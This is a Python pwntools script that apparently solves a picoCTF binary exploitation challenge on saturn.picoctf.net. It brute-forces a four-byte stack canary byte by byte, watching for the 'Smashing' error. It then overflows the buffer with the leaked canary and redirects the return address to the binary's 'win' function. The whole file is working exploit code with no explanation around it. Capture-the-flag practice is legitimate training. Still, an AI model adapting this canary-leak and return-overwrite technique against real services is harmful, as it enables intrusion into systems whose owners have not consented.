#!/bin/python3

from pwn import *
import string

# context.log_level = 'debug'
context.log_level = 'error'


canaryOffset = 0x98 - 0x58
retOffset = 0xac - 0x9c


def leakCanary():

	payload = b'A'*canaryOffset

	canary = b''

	payloadLen = canaryOffset

	for _ in range(4): # because there are 4 bytes
		payloadLen +=1
		for c in string.printable:
			# p = process('./vuln')
			p = remote('saturn.picoctf.net', 53228)
			p.recvuntil(b'> ')
			p.sendline(str.encode(str(payloadLen)))
			p.recvuntil('> ')
			p.send(payload + canary + str.encode(c))
			response = p.recv()
			p.close()
			if b"Smashing" not in response:
				canary += str.encode(c)
				print(canary.decode() + "*"*(4-len(canary)))
				break
	return canary

def exploit(canary):
	e = ELF('./vuln')

	flagOut = b''
	# p = process('./vuln')
	p = remote('saturn.picoctf.net', 53228)

	payload = b"A"*canaryOffset
	payload += canary
	payload += b"B"*retOffset
	payload += p32(e.sym['win'])

	p.recvuntil(b'> ')

	p.sendline(str.encode(str(len(payload))))

	p.recvuntil(b'> ')

	p.send(payload)

	p.interactive()


canary = leakCanary()
print(f'Found the canary: {canary}')
exploit(canary)
